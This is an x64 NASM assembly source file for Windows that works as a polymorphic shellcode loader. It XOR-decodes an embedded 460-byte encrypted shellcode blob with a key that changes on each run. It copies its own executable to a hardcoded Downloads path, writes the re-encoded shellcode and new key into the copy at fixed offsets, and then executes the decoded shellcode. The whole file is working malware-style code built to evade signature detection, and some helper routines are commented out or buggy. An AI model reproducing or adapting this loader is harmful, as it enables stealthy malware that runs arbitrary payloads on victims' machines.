global WinMain

section .data
	filePathBuffer db 260 dup(0) ;buffer to hol path
	copyPathBuffer db "C:\\Users\\vboxuser\\Downloads\\copy.exe", 0 ;buffer for copy path
	writeBuffer db 260 dup(0) ;buffer to hold data to write
	appendString db "1.exe", 0

	GENERIC_WRITE equ 0x40000000
    	OPEN_EXISTING equ 3
    	FILE_ATTRIBUTE_NORMAL equ 0x80
    	INVALID_HANDLE_VALUE equ -1

section .text
	key db 0xAA
	shell_pointer dq 0x0
	extern CreateFileA
	extern WriteFile
	extern CloseHandle
	extern GetModuleFileNameA
	extern SetFilePointer
	extern CopyFileA
	extern ExitProcess

WinMain:
	xor rax, rax
	xor rbx, rbx	

	mov al, [rel key] ;old key
	mov bl, al
	add bl, 0x03 ;new key
	xor al, bl ;transition key
	mov [rel key], bl ;saving key
	mov bl, 0x01 ;setting flag for jump to dump
	jmp short call_decoder

xoring:
	pop rsi
	mov [rel shell_pointer], rsi; rax hold pointer to shellcode
	xor rcx, rcx
	mov cx, 0x1cc ; loop is based on cx , decrements with every iteration , breaks at 0.
decode:
	xor byte [rsi], al
	inc rsi
	loop decode

	cmp bl, 0x01
	jne Shellcode
	jmp dump_disk

call_decoder:
	call xoring
Shellcode: 
	db 0x56, 0xe2, 0x29, 0x4e, 0x5a, 0x42, 0x6a, 0xaa, 0xaa, 0xaa, 0xeb, 0xfb, 0xeb, 0xfa, 0xf8, 0xfb, 0xfc, 0xe2, 0x9b, 0x78, 0xcf, 0xe2, 0x21, 0xf8, 0xca, 0xe2, 0x21, 0xf8, 0xb2, 0xe2, 0x21, 0xf8, 0x8a, 0xe2, 0x21, 0xd8, 0xfa, 0xe2, 0xa5, 0x1d, 0xe0, 0xe0, 0xe7, 0x9b, 0x63, 0xe2, 0x9b, 0x6a, 0x06, 0x96, 0xcb, 0xd6, 0xa8, 0x86, 0x8a, 0xeb, 0x6b, 0x63, 0xa7, 0xeb, 0xab, 0x6b, 0x48, 0x47, 0xf8, 0xeb, 0xfb, 0xe2, 0x21, 0xf8, 0x8a, 0x21, 0xe8, 0x96, 0xe2, 0xab, 0x7a, 0x21, 0x2a, 0x22, 0xaa, 0xaa, 0xaa, 0xe2, 0x2f, 0x6a, 0xde, 0xcd, 0xe2, 0xab, 0x7a, 0xfa, 0x21, 0xe2, 0xb2, 0xee, 0x21, 0xea, 0x8a, 0xe3, 0xab, 0x7a, 0x49, 0xfc, 0xe2, 0x55, 0x63, 0xeb, 0x21, 0x9e, 0x22, 0xe2, 0xab, 0x7c, 0xe7, 0x9b, 0x63, 0xe2, 0x9b, 0x6a, 0x06, 0xeb, 0x6b, 0x63, 0xa7, 0xeb, 0xab, 0x6b, 0x92, 0x4a, 0xdf, 0x5b, 0xe6, 0xa9, 0xe6, 0x8e, 0xa2, 0xef, 0x93, 0x7b, 0xdf, 0x72, 0xf2, 0xee, 0x21, 0xea, 0x8e, 0xe3, 0xab, 0x7a, 0xcc, 0xeb, 0x21, 0xa6, 0xe2, 0xee, 0x21, 0xea, 0xb6, 0xe3, 0xab, 0x7a, 0xeb, 0x21, 0xae, 0x22, 0xe2, 0xab, 0x7a, 0xeb, 0xf2, 0xeb, 0xf2, 0xf4, 0xf3, 0xf0, 0xeb, 0xf2, 0xeb, 0xf3, 0xeb, 0xf0, 0xe2, 0x29, 0x46, 0x8a, 0xeb, 0xf8, 0x55, 0x4a, 0xf2, 0xeb, 0xf3, 0xf0, 0xe2, 0x21, 0xb8, 0x43, 0xfd, 0x55, 0x55, 0x55, 0xf7, 0xe3, 0x14, 0xdd, 0xd9, 0x98, 0xf5, 0x99, 0x98, 0xaa, 0xaa, 0xeb, 0xfc, 0xe3, 0x23, 0x4c, 0xe2, 0x2b, 0x46, 0x0a, 0xab, 0xaa, 0xaa, 0xe3, 0x23, 0x4f, 0xe3, 0x16, 0xa8, 0xaa, 0x89, 0x83, 0xa0, 0xaa, 0xa9, 0xaf, 0xeb, 0xfe, 0xe3, 0x23, 0x4e, 0xe6, 0x23, 0x5b, 0xeb, 0x10, 0xe6, 0xdd, 0x8c, 0xad, 0x55, 0x7f, 0xe6, 0x23, 0x40, 0xc2, 0xab, 0xab, 0xaa, 0xaa, 0xf3, 0xeb, 0x10, 0x83, 0x2a, 0xc1, 0xaa, 0x55, 0x7f, 0xfa, 0xfa, 0xe7, 0x9b, 0x63, 0xe7, 0x9b, 0x6a, 0xe2, 0x55, 0x6a, 0xe2, 0x23, 0x68, 0xe2, 0x55, 0x6a, 0xe2, 0x23, 0x6b, 0xeb, 0x10, 0x40, 0xa5, 0x75, 0x4a, 0x55, 0x7f, 0xe2, 0x23, 0x6d, 0xc0, 0xba, 0xeb, 0xf2, 0xe6, 0x23, 0x48, 0xe2, 0x23, 0x53, 0xeb, 0x10, 0x33, 0x0f, 0xde, 0xcb, 0x55, 0x7f, 0xe2, 0x2b, 0x6e, 0xea, 0xa8, 0xaa, 0xaa, 0xe3, 0x12, 0xc9, 0xc7, 0xce, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xeb, 0xfa, 0xeb, 0xfa, 0xe2, 0x23, 0x48, 0xfd, 0xfd, 0xfd, 0xe7, 0x9b, 0x6a, 0xc0, 0xa7, 0xf3, 0xeb, 0xfa, 0x48, 0x56, 0xcc, 0x6d, 0xee, 0x8e, 0xfe, 0xab, 0xab, 0xe2, 0x27, 0xee, 0x8e, 0xb2, 0x6c, 0xaa, 0xc2, 0xe2, 0x23, 0x4c, 0xfc, 0xfa, 0xeb, 0xfa, 0xeb, 0xfa, 0xeb, 0xfa, 0xe3, 0x55, 0x6a, 0xeb, 0xfa, 0xe3, 0x55, 0x62, 0xe7, 0x23, 0x6b, 0xe6, 0x23, 0x6b, 0xeb, 0x10, 0xd3, 0x66, 0x95, 0x2c, 0x55, 0x7f, 0xe2, 0x9b, 0x78, 0xe2, 0x55, 0x60, 0x21, 0xa4, 0xeb, 0x10, 0xa2, 0x2d, 0xb7, 0xca, 0x55, 0x7f, 0x11, 0x00, 0x6f, 0x48, 0xf7, 0xeb, 0x10, 0x0c, 0x3f, 0x17, 0x37, 0x55, 0x7f, 0xe2, 0x29, 0x6e, 0x82, 0x96, 0xac, 0xd6, 0xa0, 0x2a, 0x51, 0x4a, 0xdf, 0xaf, 0x11, 0xed, 0xb9, 0xd8, 0xc5, 0xc0, 0xaa, 0xf3, 0xeb, 0x23, 0x70, 0x55, 0x7f 
	jmp Shellcode
dump_disk:
	;CALLING CONVENTION RCX,RDX,R8,R9 return in RAX
	;to keep in mind that parameters have to be push from last to first on stack

	xor rcx, rcx
        lea rdx, [rel filePathBuffer]
        mov r8, 260
        call GetModuleFileNameA

	;find lenght of path in order to find if the name has 1 or not
	;mov rdi, [rel filePathBuffer]
	;call _strlen
	;mov rsi, [rel filePathBuffer]
	;mov rcx, rax;rcx holds lenght
find_dot:
	;cmp byte [rsi+rcx-1], '.'
	;je found_dot
	;loop find_dot

found_dot:
	;dec rcx
	;cmp byte[rsi+rcx-1], '1'
	;je has_one

	;mov rsi, [rel filePathBuffer]
	;mov rdi, [rel copyPathBuffer]
	;call custom_copy
	
	;mov rsi, [rel appendString]
	;mov rdi, [rel copyPathBuffer]
	;call append

	;COPY ITSELF
	sub rsp, 28h
	lea rcx, [rel filePathBuffer]
	lea rdx, [rel copyPathBuffer]
	mov r8, 0
	call CopyFileA

	add rsp, 28h
    	mov ecx, 0
    	;call ExitProcess
	
	;OPEN FILE
	lea rcx, [rel copyPathBuffer]
	mov rdx, GENERIC_WRITE
	xor r8, r8
	xor r9, r9
	push 0
	push 0
	push OPEN_EXISTING
	sub rsp, 0x20 ;5th arg is called from rsp + 20
	call CreateFileA
	add rsp, 0x20

	mov r15, rax; saving handler

	;SET FILE POINTER TO WRITE SHELLCODE
	mov rcx, rax	
	mov rdx, 0xA9B
	xor r8, r8
	mov r9, 0x00;for FILE_BEGIN
	call SetFilePointer

	;WRITE FILE FOR SHELLCODE
	mov rcx, r15;file handle
	mov rdx, [rel shell_pointer]
	mov r8, 0x1cc
	mov r9, 0
	push 0
	sub rsp, 0x20
	call WriteFile
	add rsp, 0x20
	
	;SET FILE POINTER FOR KEY
	mov rcx, r15
	mov rdx, 0xA50
	xor r8, r8
	mov r9, 0x00
	call SetFilePointer

	;WRITE FILE FOR KEY
	mov rcx, r15
	mov rdx, [rel key]
	mov r8, 0x01
	mov r9, 0
	push 0
	sub rsp, 0x20
	call WriteFile
	add rsp, 0x20

	;CLOSE FILE
	mov rcx, rax
	call CloseHandle

	;KEY IS A50 - need to set file pointer and write

	xor bl, bl; setting flag for jump to run
	mov al, [rel key];current key
	jmp call_decoder


; Appends a null-terminated string (pointed to by RSI) to the end of another string (pointed to by RDI)
; Inputs: RDI - pointer to the destination string, RSI - pointer to the source string
; Outputs: None

append:
    ; Find the end of the string in RDI
    cld                 ; Clear DF flag for forward direction
    mov rax, rdi        ; Copy RDI to RAX to use it for scanning
    mov rcx, -1         ; Set RCX to the maximum value
    xor al, al          ; Null byte for comparison
    repne scasb         ; Scan until null terminator is found

    dec rdi             ; RDI now points to the null terminator of the destination string

    ; Append the string from RSI to the end of the string at RDI
append_loop:
    lodsb               ; Load byte at RSI into AL and increment RSI
    stosb               ; Store byte from AL into RDI and increment RDI
    test al, al         ; Check if we've hit the null-terminator of the source string
    jnz append_loop     ; If not, continue loop
    ret

; Copies bytes from the buffer pointed to by RSI to the buffer pointed to by RDI
; until the pointer RSI + RCX is reached.
; Inputs: RDI - destination buffer, RSI - source buffer, RCX - number of characters to copy
; Outputs: None

custom_copy:
    push rsi            ; Save RSI register
    add rsi, rcx        ; RSI now points to the end of the portion to copy
    xor rcx, rcx        ; Clear RCX for counting

copy_loop:
    cmp rdi, rsi        ; Compare current position with end position
    je end_copy         ; If equal, end copying
    mov al, [rdi]       ; Load byte from source to AL
    mov [rdi], al       ; Store byte in destination from AL
    inc rdi             ; Increment destination pointer
    inc rcx             ; Increment counter
    jmp copy_loop       ; Repeat the loop

end_copy:
    pop rsi             ; Restore original RSI value
    ret

_strlen:

  push  rcx            ; save and clear out counter
  xor   rcx, rcx

_strlen_next:

  cmp   [rdi], byte 0  ; null byte yet?
  jz    _strlen_null   ; yes, get out

  inc   rcx            ; char is ok, count it
  inc   rdi            ; move to next char
  jmp   _strlen_next   ; process again

_strlen_null:

  mov   rax, rcx       ; rcx = the length (put in rax)

  pop   rcx            ; restore rcx
  ret                  ; get out
